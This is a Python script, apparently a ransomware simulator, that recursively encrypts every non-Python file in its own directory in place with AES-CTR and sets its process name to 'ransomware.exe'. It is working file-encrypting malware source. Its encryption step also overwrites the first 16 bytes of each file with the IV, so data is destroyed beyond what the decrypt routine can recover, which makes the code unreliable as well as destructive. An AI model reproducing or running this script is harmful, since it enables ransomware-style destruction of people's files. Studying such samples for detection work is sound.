import os
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import secrets
import time
import setproctitle

def generate_key():
    """Generate a random 256-bit (32-byte) AES key"""
    return secrets.token_bytes(32)

def encrypt_file(file_path, key, chunk_size=64*1024):
    """Encrypt a file in-place using AES-CTR mode"""
    try:
        # Skip Python files
        if file_path.endswith('.py'):
            return False
        
        # Generate random IV (16 bytes for AES)
        iv = secrets.token_bytes(16)
        
        # Initialize AES-CTR cipher
        cipher = Cipher(
            algorithms.AES(key),
            modes.CTR(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        
        # Get original file size
        file_size = os.path.getsize(file_path)
        
        # Encrypt the file in chunks
        with open(file_path, 'r+b') as f:
            # Write IV at the beginning of the file
            f.write(iv)
            time.sleep(2) 
            bytes_processed = 0
            while bytes_processed < file_size:
                # Read chunk
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                
                # Encrypt chunk
                encrypted_chunk = encryptor.update(chunk)
                
                # Write encrypted chunk back to original position
                f.seek(-len(chunk), os.SEEK_CUR)
                f.write(encrypted_chunk)
                
                bytes_processed += len(chunk)

        return True
    except Exception as e:
        print(f"Error encrypting {file_path}: {str(e)}")
        return False

def decrypt_file(file_path, key, chunk_size=64*1024):
    """Decrypt a file in-place using AES-CTR mode"""
    try:
        # Skip Python files
        if file_path.endswith('.py'):
            return False
            
        with open(file_path, 'r+b') as f:
            # Read IV from beginning of file
            iv = f.read(16)
            if len(iv) != 16:
                print(f"Invalid IV in file {file_path}")
                return False
            
            # Initialize AES-CTR cipher
            cipher = Cipher(
                algorithms.AES(key),
                modes.CTR(iv),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()
            
            # Get remaining file size
            file_size = os.path.getsize(file_path) - 16
            f.seek(16)  # Skip IV
            
            bytes_processed = 0
            while bytes_processed < file_size:
                # Read chunk
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                
                # Decrypt chunk
                decrypted_chunk = decryptor.update(chunk)
                
                # Write decrypted chunk back to original position
                f.seek(-len(chunk), os.SEEK_CUR)
                f.write(decrypted_chunk)
                
                bytes_processed += len(chunk)
            
            # Truncate IV from beginning
            f.seek(file_size)
            f.truncate()
        
        return True
    except Exception as e:
        print(f"Error decrypting {file_path}: {str(e)}")
        return False

def process_directory(directory, key, mode='encrypt'):
    """Process all files in a directory and its subdirectories"""
    processed_count = 0
    process_func = encrypt_file if mode == 'encrypt' else decrypt_file
    
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            
            # Skip our own script file
            if file_path == os.path.abspath(__file__):
                continue
                
            # Try to process the file
            if process_func(file_path, key):
                processed_count += 1
                print(f"{mode.capitalize()}ed file #{processed_count}: {file_path}")
    
    return processed_count

if __name__ == "__main__":
    setproctitle.setproctitle("ransomware.exe")
    # Print current PID
    print(f"Script PID: {os.getpid()}")
    time.sleep(5)
    # Get user choice
    mode = 'encrypt'
    
    if mode == 'encrypt':
        # Generate a new key for encryption
        key = generate_key()
        time.sleep(5)
        print(f"Encryption key (save this for decryption): {key.hex()}")
    else:
        # Get key for decryption
        while True:
            try:
                key_hex = input("Enter the decryption key (hex format): ").strip()
                key = bytes.fromhex(key_hex)
                if len(key) == 32:
                    break
                print("Invalid key length. Key must be 64 hex characters (32 bytes)")
            except ValueError:
                print("Invalid hex format. Please enter a valid hex key")
    
    # Get the directory where this script is located
    target_directory = os.path.dirname(os.path.abspath(__file__))
    
    print(f"\nStarting {mode}ion process...")
    print(f"Target directory: {target_directory}")
    
    total_processed = process_directory(target_directory, key, mode)
    
    print(f"\n{mode.capitalize()}ion process complete!")
    print(f"Total files processed: {total_processed}")
